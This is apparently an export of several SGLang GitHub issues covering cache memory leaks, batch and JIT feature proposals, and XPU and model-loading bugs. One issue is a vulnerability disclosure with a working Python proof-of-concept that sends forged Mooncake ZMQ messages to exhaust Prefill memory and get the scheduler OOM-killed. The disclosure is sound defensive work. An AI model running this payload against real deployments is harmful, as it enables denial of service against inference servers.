items.title: [Bug] Unbounded compiled-grammar cache in BaseGrammarBackend leaks host memory with per-request JSON schemas
items.body:
### Checklist
- [x] 1. I have searched related issues but cannot get the expected help.
- [x] 2. The bug has not been fixed in the latest version (the cache code is unchanged on `main` as of 2026-10-19).
- [x] 3. Environment info and a minimal reproducible script are included below.
- [x] 4. This is a bug report, not a question.
- [x] 5. Written in English.

## Describe the bug

`BaseGrammarBackend.cache` (`python/sglang/srt/constrained/base_grammar_backend.py`) is a plain `dict` with no size limit, and the xgrammar backend creates `GrammarCompiler(tokenizer_info=tokenizer_info)` with xgrammar's default unbounded internal cache. Every request whose `response_format.json_schema` (or regex / EBNF) has not been seen before adds one compiled grammar to both caches, and nothing ever evicts it while the server is up. Only `/flush_cache` clears it, and `/flush_cache` is refused unless the scheduler is completely idle.

When clients send a slightly different schema per request (very common with LLM-agent frameworks that embed per-call enums, defaults, descriptions or examples in the schema), scheduler RSS grows linearly until host RAM and swap are exhausted.

## What we observed (production, 2026-10-13)

- Qwen3.6-35B-A3B-FP8, SGLang 0.5.10.post1, `--tp-size 1 --dp-size 4`, 4× H100 NVL, 128 GB host RAM + 61 GB swap.
- One client sent ~8,000 structured-output requests/day with ~1,250 distinct schemas (same prompt family, per-call enum/const values inside the schema).
- Each DP rank's scheduler process grew from 3.5 GB to 35 GB over 11 days; total 4 ranks ≈ 140 GB (RAM + swap full), server became unresponsive, 25-minute outage until manual restart.
- Memory never returned while idle. Growth happened only while structured-output requests were processed.

Measured cost per *new* schema (vocab 151k, xgrammar 0.1.32): **+250–380 MB RSS per scheduler process**. Re-sending the *same* schema 4× costs ~+6 MB total. A 60 KB schema costs several GB.

## Reproduction

Start any model with default args (xgrammar backend). Then:

```python
import json, requests, uuid
URL = "http://127.0.0.1:30000/v1/chat/completions"
for i in range(20):
    schema = {"type": "object",
              "properties": {f"field_{j}": {"type": "string", "enum": [f"{uuid.uuid4()}" for _ in range(5)]} for j in range(30)},
              "required": [f"field_{j}" for j in range(30)]}
    body = {"model": "default", "max_tokens": 64,
            "messages": [{"role": "user", "content": "Return an object."}],
            "response_format": {"type": "json_schema", "json_schema": {"name": f"s{i}", "schema": schema}}}
    requests.post(URL, json=body, timeout=120)
```

Watch `VmRSS` of the `sglang::scheduler` process between requests: it grows by hundreds of MB per iteration and does not come back. Sending the same schema 20× does not grow it.

## Expected behavior

The compiled-grammar cache should be bounded (LRU by entry count and/or bytes), and the bound should be configurable. A request that is never repeated should not permanently consume host memory.

## Proposed fix (I can open PRs)

1. Make `BaseGrammarBackend.cache` an LRU (`OrderedDict`, evict oldest on insert) with a configurable max entry count. In-flight requests already hold their own `copy()` of the grammar object, so eviction is safe.
2. Pass `cache_limit_bytes` to xgrammar's `GrammarCompiler` (xgrammar ≥ 0.1.21 supports it) with a sane default (e.g. 1 GiB).
3. Optionally skip caching grammars whose key string exceeds a size threshold (very large schemas are almost never reused and dominate memory).

We have been running (1)+(2)+(3) in production since 2026-10-14: 17.5 h uptime now plateaus at 12–21 GB total across 4 ranks instead of growing without bound, throughput unchanged (333 vs 334 tok/s single stream).

## Environment

- SGLang 0.5.10.post1 (problem code is unchanged on current `main`: `self.cache: Dict[...] = {}`, `GrammarCompiler(tokenizer_info=tokenizer_info)`)
- xgrammar 0.1.32, torch 2.x, CUDA 12.x, 4× NVIDIA H100 NVL, Ubuntu 20.04
- Grammar backend: xgrammar (default)

items.title: [Feature] Offline batch runner for OpenAI batch files (follow-up to #7427)
items.body:
### Checklist

- [x] If this is not a feature request but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.
- [x] Please use English. Otherwise, it will be closed.

### Motivation

Hi all! 👋

Back in #7427, the `/v1/batches` and `/v1/files` endpoints were taken out of the online server, and the plan was to replace them with a separate offline batch workflow. As far as I can tell, that replacement never landed. The RFC was closed by the stale bot, and a few people have asked about it since (July 2025, March 2026).

So today, if you want to run an OpenAI-style batch file on SGLang, you write your own script around `sgl.Engine`. Everyone ends up re-doing chat templates, structured outputs and error handling, and the results don't quite match what the server would return.

I'd love to help close this gap, and I'm happy to build it if the idea below works for you.

**The idea: `python -m sglang.launch_batch`** (or `sglang run-batch`, whichever you prefer)

```
python -m sglang.launch_batch \
  --model-path Qwen/Qwen2.5-7B-Instruct \
  -i requests.jsonl -o results.jsonl [--resume] [usual server args]
```

How it would work:

- **Input:** the standard OpenAI batch format, one request per line (`custom_id`, `method`, `url`, `body`). To start: `/v1/chat/completions`, `/v1/completions` and `/v1/embeddings`.
- **Running it:** start an `Engine` in the same process (no HTTP server) and send each line through the existing `OpenAIServingChat`, `OpenAIServingCompletion` and `OpenAIServingEmbedding` handlers. That way chat templates, tool calls and JSON-schema output behave exactly like they do on the server.
- **Output:** the standard OpenAI batch output, one line per request, in the same order as the input. Results get written as they finish instead of all at the end, so if a run gets interrupted, the finished work is still there.
- **Handling problems:**
  - A broken or unsupported line gets its own error line instead of stopping the whole batch.
  - Duplicate `custom_id`s are caught before the model even loads.
  - `--resume` skips requests that already succeeded, retries the rest, and ignores a half-written last line.
- **Not included for now:** the `/v1/batches` and `/v1/files` HTTP endpoints, completion windows, and multi-node sharding. Those are the parts #7427 said were risky on the online server, so this keeps everything offline.

**Why I care about this:** big batch jobs get interrupted all the time (spot instances, evictions, dropped connections), and silent per-line failures are easy to miss. I've been measuring exactly this on hosted batch APIs at up to 100,000 records, with a self-hosted vLLM baseline (https://github.com/kotwal-itpro/steadybatch, with results and write-ups). A runner that can resume and reports errors per line would make SGLang a great fit for this kind of work.

**A few questions before I start**

1. Is an offline runner like this still wanted? And is `sglang.launch_batch` a good home, or would you rather see it as a CLI subcommand?
2. The OpenAI handlers use the FastAPI `Request` in a few places (logging, labels, routing keys, disconnect checks). Would you prefer I pass a small stand-in object, or make those spots accept `None`?
3. Any preference on limiting concurrency? For example, reuse the server's admission limits, or add a simple `--max-inflight` option?

**If this sounds good,** I'd split it into a few small PRs:
1. The runner with chat completions, ordered output written as it goes, per-line errors, and tests
2. Completions and embeddings
3. `--resume` and the duplicate-ID check
4. Docs and an example

Thanks for taking a look! 🙏

### Related resources

- #7427 RFC: Redesign Batch Processing as an Offline Workflow
- #7068 OpenAI-compatible server refactor (where batch support was removed)
- OpenAI batch input and output format: https://platform.openai.com/docs/guides/batch
- For comparison, vLLM's `vllm run-batch` and the work there on writing results as they finish (vllm-project/vllm#52505) and resuming (vllm-project/vllm#60184)

items.title: [Feature] jit: Probe-once fail-fast when the toolchain cannot compile anything (glibc 2.42 rsqrt clash)
items.body:
## Motivation

Follow-up to #38516 (and #45060, which only covers pre-SM80 GPUs).

On distributions with glibc >= 2.42 (Ubuntu 25.10, Fedora 43, Arch), every nvcc compile fails against CUDA <= 13.1 headers: glibc added host `rsqrt`/`rsqrtf` declarations with `noexcept (true)`, which conflict with the declarations in `crt/math_functions.h` ([Arch report](https://gitlab.archlinux.org/archlinux/packaging/packages/cuda/-/issues/15), [NVIDIA forum, CUDA 13.1 / Fedora 43](https://forums.developer.nvidia.com/t/fedora-43-and-nvcc-cuda13-1-error-exception-specification-is-incompatible-rsqrt-rsqrtf/354510), [Gentoo's header patch](https://ftp.fau.de/gentoo-portage/dev-util/nvidia-cuda-toolkit/files/nvidia-cuda-toolkit-glibc-2.42.patch)).

The header conflict itself is NVIDIA's to fix (they fixed the analogous `sinpi`/`cospi` clash in CUDA 13.0), and distros carry local patches meanwhile. What SGLang owns is the failure mode: on an affected toolchain, every JIT module pays a full doomed nvcc build before its op soft-falls back — tens of seconds of serial compile attempts on the first request, on every GPU generation, with a compiler error dump per module.

## Proposal

A probe-once fail-fast in the JIT loader: one small throwaway compile the first time `load_jit` is reached. If the probe cannot build, disable JIT for the process and let every op fall back immediately, with a single log line naming the toolchain problem (and the known-bad glibc/CUDA combination when it matches). Affected users then get working Triton/torch fallbacks after one fast failure instead of N slow ones.

Open questions for the kernels owners:

- Probe at first `load_jit` use, or eagerly at startup?
- Cache the probe verdict on disk keyed by a toolchain fingerprint (nvcc path/version + glibc version), or re-probe per process?
- Escape-hatch env var to force JIT on despite a failed probe?

Happy to implement once the shape is agreed. The glibc 2.42 troubleshooting docs entry already landed in #45060.

## Related resources

https://github.com/sgl-project/sglang/issues/38516

items.title: [Bug] [XPU] DSpark drafts all rejected under full decode graph with TP=2: TP ranks diverge on draft graph replay
items.body:
### Checklist

- [x] I searched related issues but found no solution.
- [x] The bug persists in the latest version.
- [x] Environment info and a reproducible test are included below.

### Describe the bug

On Intel XPU, DSpark speculative decoding with `--cuda-graph-backend-decode full` and `--tp 2` rejects almost every draft: accept length is ~1.0, vs ~3.3 without the decode graph. Output stays correct, because the target verify runs eagerly and corrects every token, but speculative decoding gives no speedup.

Found in the Intel kernel-main nightly, 2-GPU job (https://github.com/sgl-project/sglang/actions/runs/39063278229). It was hidden behind a CUDA-only assert that crashed `setUpClass`, which is fixed in #45033. That PR also disables `test/registered/e2e/xpu/test_dspark_intel_xpu.py` in the XPU nightly registry until this issue is fixed.

**Expected:** Accept length close to eager mode: `TestBasicSanityDSparkXpuIntelXpu` (no decode graph) averages ~3.25, and Triton without a graph ~3.33.

**Actual:** `AssertionError: avg_spec_accept_length=1.000 did not exceed threshold 2.0`. 288 of 291 decode logs show `accept len: 1.00`. Accuracy tests in the same class pass, because the target verify runs eagerly and corrects every token.

#### Investigation

| Experiment | Avg accept length |
|---|---|
| No decode graph, intel_xpu / triton | 3.25 / 3.33 |
| Full graph, intel_xpu (CI config) | 1.00 |
| Full graph, triton backend | 1.00 |
| Full graph + `SGLANG_SPEC_TP_SYNC=all,-dspark-draft` (no in-graph draft broadcast) | 1.00 |
| Full graph + `SGLANG_DSPARK_USE_GREEDY_DRAFT=1` (argmax draft) | 1.10 |
| Full graph + `SGLANG_DSPARK_FOLDED_PROPOSAL=0` (sampler outside graph) | 1.52 |
| Full graph + `UR_L0_V2_FORCE_DISABLE_COPY_OFFLOAD=1` | 1.00 |

Debug dumps:
- **Inputs are correct.** For the same step, the draft graph's attention metadata matches eager exactly: `cache_seqlens=[13]`, `cu_seqlens_q=[0,7]`, `cu_seqlens_k=[0,13]`, page 1, write slots 134..140. Target hidden states are injected into the draft KV eagerly in both modes (`commit_hidden`; the CUDA-only verify epilogue isn't used on XPU).
- **Outputs are wrong from the first step.** With the same bonus token, positions, and seq_len, eager drafts `[13, 576, 3283, 374, ...]` and graph drafts `[1103, 49614, 748, ...]`. After that, the graph's last 6 draft tokens are the same at every step.
- **TP ranks diverge only in graph mode.** I ran the same draft batch eagerly, then through the graph, and compared `hidden_states`. Eager: both ranks have identical per-row norms (107.7, 110.9, 112.9, ...). Graph: rank 0 gives (113.5, 113.4, 114.3, ...) and rank 1 gives (113.3, 110.9, 111.2, ...). After a TP all-reduce the ranks must match, so the reduction doesn't take effect in the replayed XPU graph.

#### Suspected cause

On XPU, `GroupCoordinator.all_reduce` routes to `inplace_all_reduce`, which calls `torch.distributed.all_reduce` on the XCCL device group. Inside `torch.xpu.XPUGraph` capture, the collective is likely executed at capture time but not recorded (oneCCL works on its own queue), so replays skip it and each rank carries its partial sum.

Not yet confirmed for non-speculative models: XPU CI never runs a decode graph with TP>1 (all decode logs in the 2-GPU job show `cuda graph: False`, since XPU defaults decode graphs off). An attempt with Llama-3.1-8B TP=2 + full graph stalled in graph capture (scheduler watchdog) while another experiment shared GPU 1, so it needs a clean rerun.

#### Suggested next steps

1. Rerun Llama-3.1-8B TP=2 with `--cuda-graph-backend-decode full` on idle GPUs and check gsm8k. If it also degrades, the bug is general to XPU decode graphs with TP>1.
2. Short term: have `handle_xpu_backends` (`python/sglang/srt/arg_groups/platform_hook.py`) disable the decode graph when tp_size > 1, with a warning.
3. Long term: a graph-capturable all-reduce on XPU (sglang custom all-reduce, or XCCL/oneCCL recording into SYCL graphs). Then re-enable `test_dspark_intel_xpu.py`.

The debug patches (draft-token dump, attention-metadata dump, eager-vs-graph hidden-state compare) and the full logs from the Intel CI runner are available on request.

### Reproduction

1. Apply PR #45033, or at least its `dspark_draft_sampler.py` change. Without it, setUpClass crashes first.
2. Re-enable the file locally, then run:
   `python3 test/registered/e2e/xpu/test_dspark_intel_xpu.py TestBasicSanityDSparkXpuIntelXpuDecodeGraph.test_fwd_occupancy`
   That class is `TestBasicSanityDSparkXpuIntelXpu` plus `--cuda-graph-backend-decode full`.

### Environment

- Runner: aicf-jf-cicd-06, 8x Arc Pro B60 (BMG), kernel 6.17.0-35-generic (xe), GuC fw 70.45.2
- Image: `intel/sglang-dev:latest-kernel-main` (a890b33dced6): sglang 0.5.23.dev300+g8dee3f6bd, sgl-kernel-xpu 0.4.0, torch 2.14.0+xpu
- Model: Qwen/Qwen3-14B target + deepseek-ai/dspark_qwen3_14b_block7 draft, bf16, `--tp 2 --base-gpu-id 1`
- Attention: `intel_xpu` for target and draft (Triton behaves the same)

items.title: [Bug] InternVL with a GPT-OSS backbone fails to load weights (UnboundLocalError: stacked_params_mapping)
items.body:
### Checklist

- [x] I searched related issues but found no solution.
- [x] The bug persists in the latest version.
- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.
- [x] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.
- [x] Please use English. Otherwise, it will be closed.

### Describe the bug

`InternVLChatModel` builds a `GptOssForCausalLM` language model when `llm_config.architectures[0] == "GptOssForCausalLM"`, but `InternVLChatModel.load_weights` has no branch for that backbone. `stacked_params_mapping` is never assigned, so loading fails on the first weight:

```
UnboundLocalError: cannot access local variable 'stacked_params_mapping' where it is not associated with a value
```

This blocks the public checkpoint `OpenGVLab/InternVL3_5-GPT-OSS-20B-A4B-Preview` (bf16, `GptOssForCausalLM` backbone).

Defining the variable would not be enough: the generic loop also skips the GPT-OSS specific loading in `GptOssForCausalLM.load_weights` (qkv splitting, attention sinks, and the bf16/mxfp4/quark expert layouts), so the language weights need to go through that loader.

### Reproduction

Load an InternVL model whose `llm_config.architectures[0]` is `GptOssForCausalLM`, e.g. `OpenGVLab/InternVL3_5-GPT-OSS-20B-A4B-Preview`. Weight loading raises the error above in `internvl.py` (`load_weights`, line 737 at `e9b22a0818`).

A CPU unit test that calls `InternVLChatModel.load_weights` with GPT-OSS language weights reproduces it without a GPU; it is added in the fix PR (`test/registered/unit/models/test_internvl_gpt_oss_loader.py`).

### Environment

sglang main at `e9b22a0818`, torch 2.14.1+cpu, CPU-only Linux (unit test). The crash is on the weight-loading path, before any GPU work.

Fix: #45009

items.title: [Feature]  Streamed restore: chunked materialization for oversized storage hits in buffer_only HiCache mode
items.body:
### Checklist

- [x] If this is not a feature request but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.
- [x] Please use English. Otherwise, it will be closed.

### Motivation


`--hicache-host-memory-mode buffer_only` (PR #34798 + #36345) turned host RAM
into a pure staging buffer between L3 (disk) and L1 (VRAM), which fixed a
whole class of L2/L1 consistency problems. But it introduced a hard sizing
constraint: **a storage hit larger than the empty host arena is rejected
wholesale** (`_reject_oversized_prefetch` → *"declined: cannot fit in an
empty host arena"*), and the entire prompt is recomputed by prefill even
though every one of its pages exists on disk.

In practice this forces `--hicache-size` to be at least as large as the
longest conversation (host RAM ≈ max context), defeating the point of a
"transit buffer" for long-context agentic workloads:

- Qwen3.8-27B hybrid GDN, 524k context (YaRN), TP=4: `hicache-size 6`
  (~24 GiB of pinned host RAM across ranks) just to guarantee that a 500k
  restore never gets declined.
- Cold prefill of a 300k prompt: **~89 s** at ~3.4k tok/s. The same prompt
  is fully written to L3 via `write_through`, yet it is still re-prefilled
  from scratch whenever it exceeds the arena.

What buffer_only is missing is the ability to **stream an oversized hit
through a small arena in chunks**, the same way a download streams through
a bounded socket buffer — the arena should be a throughput knob, not a
capacity ceiling.



## Proposed approach

Split an oversized hit into arena-sized chunks and pipeline them:

1. **Trim** (`_trim_oversized_prefetch`): instead of rejecting, cut the hit
   to the largest page-aligned prefix that fits an *empty* arena
   (anti-livelock: a busy arena still defers the whole hit) and park the
   remainder in a `pending_stream_tails` registry.
2. **Materialize** (`_materialize_stream_chunk`): an intermediate chunk is
   published straight to the device tree as a **KV-only leaf** (evict →
   `cc.load` H2D → root-relative insert with the stock ownership
   choreography and a fail-stop post-insert check). The mamba state is
   not needed mid-span: the tree keeps FULL-only leaves valid, and the
   joint match excludes them until the endpoint checkpoint lands.
3. **Continue** (`_finish_stream_chunk` at the H2D ack): free the bounce,
   unpin the leaf, settle the chunk's share of the storage-hit accounting,
   and re-issue the parked tail as a fresh prefetch into the hit drain —
   which may trim again for 3+ chunk spans.
4. **Admit**: the *final* chunk rides the normal staged-admission path; by
   then the device tree holds every earlier chunk, `prepare_staged_prefetch`
   plans from the FULL match over the whole span, and the mamba endpoint
   checkpoint arrives with the tail's TRAILING_PAGES fetch.

The main invariants the implementation must preserve: the admission gate
has to hold the request across the whole chunk cycle (it spans scheduler
ticks where `ongoing_prefetch` is empty); each chunk's H2D needs an explicit
`start_loading()` (stock only submits loads during admission, which the
gate withholds) plus a `has_free_load_back_slot()` check; and the Rust
TreeCore currently expects a donated `mamba_value` on every insert
(`rust/sglang-radix-tree/src/components/mamba.rs`), so KV-only leaves today
require `SGLANG_UNIFIED_RADIX_TREE_CORE_BACKEND=python` or a Rust-side
change. The full lifecycle rules (anchor pins, stale-tail rebasing,
accounting) are documented in the patch header linked below.

## Measured results

TP=4 RTX 5090, Qwen3.8-27B NVFP4 hybrid GDN, 298,567-token prompt, L3 on
PCIe Gen5 NVMe RAID0, sglang main `ed8c3139f1` (2026-10-16). `hicache-size`
is per-rank GiB (TP=4): size 6 ≈ 24 GiB total, size 2 ≈ 8 GiB total.

| Metric | Before (size 6, whole-hit-or-decline) | After (size 2, streamed) |
|---|---|---|
| Host staging RAM (TP=4 total) | 24 GiB (arena 647k > max ctx — streaming never triggers) | **8 GiB** (arena 216k) |
| Warm restore from disk (L1 empty) | n/a at size 2 — would decline & re-prefill **~89 s** | **15.5 s** (2 chunks: 215,680 + 82,880; 298,560/298,567 tokens from storage = 99.998%) |
| Repeat hit after restore | 0.4 s (L1) | 0.4 s (L1) |
| Decode / EAGLE over restored ctx | 144 tok/s, accept 0.68 | unchanged |

Server flags for the "After" column (full setup in the Gist):

```bash
--enable-hierarchical-cache --hicache-host-memory-mode buffer_only \
--hicache-size 2 --hicache-mem-layout page_first --hicache-io-backend kernel \
--hicache-write-policy write_through --hicache-storage-backend file \
--hicache-storage-prefetch-policy timeout --page-size 64 --tp 4
```

RAM cost drops 3× while keeping the zero-recompute guarantee for any
conversation length; `--hicache-size` becomes a throughput/parallelism knob
instead of a correctness constraint.



### Related resources


- **Working patch (Gist)**: [`streamed-restore.patch` ](https://gist.github.com/R-omk/5ea76d1317147af28393654f58ebd859) 
  against sgl-project/sglang@ed8c3139f1 (main, 2026-10-16), three files
  (`buffer_mode/pipeline.py`, `unified_radix_cache.py`,
  `unified_cache/components/mamba.py`), ~1,100 diff lines.
  Self-contained header documents scope: TP lockstep preserved, SWA models
  excluded (declined as before), PP prefetch excluded (asserted), requires
  the Python TreeCore today.
- The decline being removed: `_reject_oversized_prefetch` in
  `python/sglang/srt/mem_cache/buffer_mode/pipeline.py`.
- Buffer-only mode foundation: #34798, #36345 (Mamba support).
- Adjacent open work the patch builds on: #41453 (in-flight storage prefetch
  retry helper — the tail re-issue reuses the same retry set),
  #44344 (write-backlog throttle — orthogonal, write side).

The patch has been exercised on single-request cold and warm restores,
modified-tail requests, and mid-cycle aborts, with correct decode output
over the restored context

items.title: [Bug] [model-gateway] QueueProcessor leaks a rate-limit token when a queued client disconnects
[Bug] Unauthenticated Mooncake STAGING_RSP chunk index causes Prefill scheduler OOM
items.body:
### Checklist

- [x] I searched related issues but found no solution.
- [x] The bug persists in the latest version.
- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.
- [x] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.
- [x] Please use English. Otherwise, it will be closed.

### Describe the bug

### Summary

SGLang Prefill workers accept unauthenticated Mooncake PD control messages on their ZeroMQ rank socket. A network peer that can reach the socket first sends a normal-looking transfer message to create a fake room, then sends a `STAGING_RSP` message with an arbitrary `chunk_idx`. The Prefill side grows three Python lists to `chunk_idx + 1` entries with no bound, exhausting host memory. In a two-host test on SGLang 0.5.15.post1 this raised Prefill cgroup memory by 12.23 GiB, made overlapping inference requests 46.9 times slower on average, and the cgroup OOM killer terminated the Prefill scheduler. The dispatch and the unbounded growth are unchanged in v0.5.21, the latest release (source-checked; v0.5.21 was not runtime-tested). This is the opposite direction of CVE-2026-93838, which covers `STAGING_REQ` handled on the Decode side; fixing that path does not fix this one. Suggested severity is Moderate. The attacker must be able to reach the Prefill bootstrap and rank endpoints; a normal model API request cannot trigger this path.

### Details

The entry point is the Prefill receive thread started by `MooncakeKVManager.start_prefill_thread()` in `python/sglang/srt/disaggregation/mooncake/conn.py`. It trusts the first ZMQ frame as a message type or room ID. A normal-looking eight-frame message with an arbitrary room and session creates `self.transfer_infos[room][session]`. No real Decode worker or prior application request is required.

- [v0.5.15 conn.py, the runtime-tested version](https://github.com/sgl-project/sglang/blob/v0.5.15/python/sglang/srt/disaggregation/mooncake/conn.py#L1447-L1529)
- [v0.5.21 conn.py, the latest release](https://github.com/sgl-project/sglang/blob/v0.5.21/python/sglang/srt/disaggregation/mooncake/conn.py)

The same thread dispatches any message whose first frame is `STAGING_RSP` to `handle_staging_rsp()` in `python/sglang/srt/disaggregation/common/staging_handler.py`. The dispatch is not conditional on `SGLANG_DISAGG_STAGING_BUFFER`, so the path works with staging disabled. `handle_staging_rsp()` parses the sender-controlled chunk index, looks up the attacker-created room and session, creates `StagingTransferInfo`, and calls `set_chunk()`.

- [v0.5.15 staging_handler.py, the runtime-tested version](https://github.com/sgl-project/sglang/blob/v0.5.15/python/sglang/srt/disaggregation/common/staging_handler.py#L421-L464)
- [v0.5.21 staging_handler.py, the latest release](https://github.com/sgl-project/sglang/blob/v0.5.21/python/sglang/srt/disaggregation/common/staging_handler.py)

`StagingTransferInfo.set_chunk()` uses the received index as a host-memory growth target:

```python
def set_chunk(self, idx: int, offset: int, rnd: int, end: int):
    while len(self.offsets) <= idx:
        self.offsets.append(-1)
        self.rounds.append(0)
        self.ends.append(-1)
    self.offsets[idx] = offset
    self.rounds[idx] = rnd
    self.ends[idx] = end
```

There is no peer authentication, room ownership check, session binding, maximum chunk index, per-peer quota, or global quota before this allocation. The Prefill bootstrap `/route` endpoint returns the dynamic rank IP and port without authentication. A reachable peer can therefore impersonate a Decode-side sender and repeat the allocation under fresh room and session IDs.

The runtime reproduction used stock 0.5.15.post1 files that exactly match the official v0.5.15 tag:

```text
9106dfc8deb91662bdbac850f41612104a597b7f6a5cd15c8eb7ca17a20c8a0d  sglang/srt/disaggregation/mooncake/conn.py
886c87979abb015b63b0274e7f03ff6367767a665068f5bc08f0cb8fdcece9f5  sglang/srt/disaggregation/common/staging_handler.py
```

The same unchecked dispatch and list-growth logic was also present in `main` at commit `ae848116662ece923501131ce773a4602223237e`, inspected on 2026-08-01. The v0.5.21 tag was source-checked on 2026-10-18 and the code paths are unchanged: the Prefill receive thread still dispatches first-frame `STAGING_RSP` to `handle_staging_rsp()` before any other check, room creation is still unconditional, and `set_chunk()` still grows the three lists in the same `while` loop with no bound. The two PoC message formats below parse the same way in v0.5.21.

### Reproduction

Run this only in an isolated test deployment. Put only the Prefill process in a memory-limited cgroup. The validated setup used Linux, Python 3.12.13, SGLang 0.5.15.post1, mooncake-transfer-engine 0.3.11.post1, PyTorch 2.11.0, pyzmq 27.1.0, Qwen3-8B, two NVIDIA A100 80 GB GPUs, and one Prefill plus one Decode worker on the victim host. The attacker was a second host on the same network.

In the first terminal, start Prefill with its HTTP listener exposed to the test network and with staging explicitly disabled. The exact model path can be changed to a local Qwen3-8B path.

```
export VICTIM_IP=192.168.55.134

systemd-run --user --scope \
  -p MemoryMax=16G \
  -p MemorySwapMax=0 \
  --setenv=CUDA_VISIBLE_DEVICES=0 \
  --setenv=SGLANG_DISAGG_STAGING_BUFFER=0 \
  -- python -m sglang.launch_server \
    --model-path Qwen/Qwen3-8B \
    --host 0.0.0.0 \
    --port 32400 \
    --tp-size 1 \
    --mem-fraction-static 0.50 \
    --disaggregation-mode prefill \
    --disaggregation-transfer-backend mooncake \
    --disaggregation-bootstrap-port 32498 \
    --engine-info-bootstrap-port 32489 \
    --served-model-name Qwen3-8B \
    --disable-cuda-graph
```

In a second terminal, start Decode outside that cgroup:

```
CUDA_VISIBLE_DEVICES=1 python -m sglang.launch_server \
  --model-path Qwen/Qwen3-8B \
  --host 127.0.0.1 \
  --port 32401 \
  --tp-size 1 \
  --mem-fraction-static 0.50 \
  --disaggregation-mode decode \
  --disaggregation-transfer-backend mooncake \
  --engine-info-bootstrap-port 32490 \
  --served-model-name Qwen3-8B \
  --disable-cuda-graph
```

In a third terminal, start the PD router outside the Prefill cgroup:

```
python -m sglang_router.launch_router \
  --pd-disaggregation \
  --prefill "http://${VICTIM_IP}:32400" 32498 \
  --decode http://127.0.0.1:32401 \
  --host 0.0.0.0 \
  --port 32480 \
  --policy round_robin
```

Save the following as `poc.py` on the second host. Install `pyzmq`, then run `python poc.py --bootstrap-host 192.168.55.134`. The defaults reproduce the pressure used in the validated OOM run. Reduce `--sessions` for a non-OOM check.

```python
#!/usr/bin/env python3
import argparse
import json
import time
import urllib.parse
import urllib.request
import uuid

import zmq


def create_transfer(room: str, session: str) -> list[bytes]:
    return [
        room.encode("ascii"),
        b"127.0.0.1",
        b"1",
        session.encode("ascii"),
        b"",
        b"",
        b"",
        b"2",
    ]


def staging_response(room: str, chunk_idx: int, session: str) -> list[bytes]:
    return [
        b"STAGING_RSP",
        room.encode("ascii"),
        str(chunk_idx).encode("ascii"),
        b"0",
        b"0",
        b"0",
        session.encode("ascii"),
    ]


parser = argparse.ArgumentParser()
parser.add_argument("--bootstrap-host", required=True)
parser.add_argument("--bootstrap-port", type=int, default=32498)
parser.add_argument("--sessions", type=int, default=3160)
parser.add_argument("--chunk-index", type=int, default=200000)
args = parser.parse_args()

query = urllib.parse.urlencode(
    {
        "prefill_dp_rank": 0,
        "prefill_cp_rank": 0,
        "target_tp_rank": 0,
        "target_pp_rank": 0,
    }
)
route_url = (
    f"http://{args.bootstrap_host}:{args.bootstrap_port}/route?{query}"
)
with urllib.request.urlopen(route_url, timeout=5) as response:
    route = json.loads(response.read())

context = zmq.Context()
socket = context.socket(zmq.PUSH)
socket.setsockopt(zmq.LINGER, 0)
socket.setsockopt(zmq.SNDTIMEO, 30000)
socket.connect(f"tcp://{route['rank_ip']}:{route['rank_port']}")
time.sleep(0.3)

sent = 0
for index in range(args.sessions):
    room = str(500000 + index)
    session = f"c1-{uuid.uuid4().hex[:16]}"
    socket.send_multipart(create_transfer(room, session))
    time.sleep(0.01)
    socket.send_multipart(staging_response(room, args.chunk_index, session))
    sent += 1
    if sent % 20 == 0:
        print(f"sessions={sent}", flush=True)
        time.sleep(0.2)

socket.close(0)
context.term()
```

Send normal requests through the router before and during the script. For example, repeat this request every 0.4 seconds and record total time:

```
curl -sS -o /dev/null -w '%{http_code} %{time_total}\n' \
  http://127.0.0.1:32480/v1/completions \
  -H 'Content-Type: application/json' \
  -d '{"model":"Qwen3-8B","prompt":"Explain PD disaggregation in one short sentence.","max_tokens":12,"temperature":0}'
```

Monitor `memory.current`, `memory.max`, `memory.events`, the Prefill scope journal, and the Prefill child processes. The expected secure behavior is to reject an unrecognized peer, room, or session and to reject a chunk index outside a small protocol-derived bound. Memory use should remain bounded and the scheduler should stay alive.

The stock-code OOM run produced these results:

| Signal                    | Before attack        | During or after attack                                       |
| ------------------------- | -------------------- | ------------------------------------------------------------ |
| Successful timed requests | 9/9                  | 4/4; the final response completed in the OOM record's wall-clock second |
| Mean completion time      | 0.3418 s             | 16.0319 s                                                    |
| Completion-time range     | 0.3332-0.3732 s      | 14.9505-16.7921 s                                            |
| Prefill `memory.current`  | 3,718,656,000 bytes  | 16,847,175,680 bytes                                         |
| Prefill memory limit      | 17,179,869,184 bytes | 98.06% reached in the last sample                            |

The attack sender enqueued 3,160 unique sessions and 6,320 multipart messages over 64.53 seconds. The sum of the multipart application-frame lengths was 224,360 bytes. Prefill cgroup memory increased by 13,128,519,680 bytes, or 12.23 GiB. The mean latency of the four requests overlapping the attack was 46.9 times the preceding mean. The fourth response completed at 18:06:10.260 local time. The systemd OOM record has one-second resolution and is stamped 18:06:10, so this result does not infer ordering within that second.

One second after the last memory sample, systemd recorded:

```text
sglang-prefill-c1-p2_pressure_t1-3316204.scope: A process of this unit has been killed by the OOM killer.
```

The ready snapshot contained the Prefill scheduler PID. The post-attack process snapshot still contained the Prefill launcher and detokenizer but no longer contained that scheduler PID. A clean stack restart restored 15/15 requests with a 0.2677-second P95.

An instrumented root-cause run used one 85-byte pair of application messages with `chunk_idx=500000`. It recorded all three list lengths growing from 1 to 500,001 inside the scheduler process in 0.08138 seconds. The OOM and latency measurements above used unmodified stock files; instrumentation was used only for this control-flow trace.

Three additional fresh-process stock trials compared 500 sessions with `chunk_idx=1` against 500 sessions with `chunk_idx=200000`. The large-index attack-window P95 was 1.93, 1.97, and 2.11 times the matched small-index P95. The effect was localized to the attack window; this result does not claim that whole-trial P95 doubled.


### Environment

SGLang 0.5.15.post1

items.title: [Bug] Unauthenticated Mooncake Decode registrations can exhaust Prefill memory and cause inference denial of service
items.body:
### Checklist

- [x] I searched related issues but found no solution.
- [x] The bug persists in the latest version.
- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.
